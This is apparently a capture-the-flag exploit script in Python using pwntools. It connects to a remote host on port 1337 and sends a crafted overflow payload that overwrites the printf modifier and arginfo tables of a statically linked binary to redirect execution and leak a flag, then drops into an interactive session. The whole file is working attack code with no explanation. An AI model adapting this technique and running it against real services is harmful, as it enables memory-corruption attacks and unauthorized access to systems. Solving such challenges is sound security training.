#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.17"
host = "35.198.130.245"
port = 1337
#port = 8888
#port = 4869



r = remote(host,port)
buf = 0x6b73e0
printf_modifier_table = 0x00000000006b7048
functable_addr = buf + 0x30
arginfo_addr = buf + 0x60
scanf = 0x400a2d
payload = p64(buf+8)  + p64(0) + p32(2) + p32(0x2e) + p32(0)
payload = payload.ljust(0x160,"a") + p64(0x400434) 
payload = payload.ljust(0x5a0,"a") + p64(0x6b7988) + p64(0x6b4040)
flag = 0x6b4040
payload = payload.ljust(0x648,"b")  + p64(functable_addr) + p64(printf_modifier_table)
payload = payload.ljust(0x6c8,"b")  + p64(arginfo_addr)
r.sendline(payload)
payload2 = ""

r.interactive()
